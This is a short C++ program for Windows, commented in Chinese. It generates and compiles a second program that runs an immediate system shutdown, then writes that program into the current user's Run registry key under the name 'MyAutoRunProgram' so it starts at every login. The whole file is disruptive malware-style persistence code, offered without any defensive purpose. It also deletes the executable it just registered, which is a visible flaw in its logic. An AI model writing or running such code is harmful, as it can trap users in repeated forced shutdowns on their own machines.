#include <iostream>
#include <fstream>
#include <cstdlib>
#include <windows.h>
void SetAutoRun(const std::string& programPath) {
	HKEY hKey;
	const char* keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	
	if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
		RegSetValueEx(hKey, "MyAutoRunProgram", 0, REG_SZ, (const BYTE*)programPath.c_str(), programPath.length() + 1);
		RegCloseKey(hKey);
		std::cout << "Program set to run at startup." << std::endl;
	} else {
		std::cout << "Error opening registry key." << std::endl;
	}
}
int main() {
	// 要写入的 C++ 代码
	std::string code = "#include <iostream>\n#include <cstdlib>\nint main() {\nsystem(\"shutdown /s /t 0\");\nreturn 0;}";

// 创建并打开一个新的 cpp 文件
	std::ofstream outFile("generated_program.cpp");
	if (!outFile) {
	std::cerr << "无法创建文件!" << std::endl;
	return 1;
	}
	
	// 写入代码到文件
	outFile << code;
	outFile.close();
	
	// 编译生成的 cpp 文件
	system("g++ generated_program.cpp -o generated_program");
	std::string programPath = "generated_program.exe";
	SetAutoRun(programPath);
	std::remove("generated_program.cpp");
	std::remove("generated_program.exe");
	return 0;
	
}

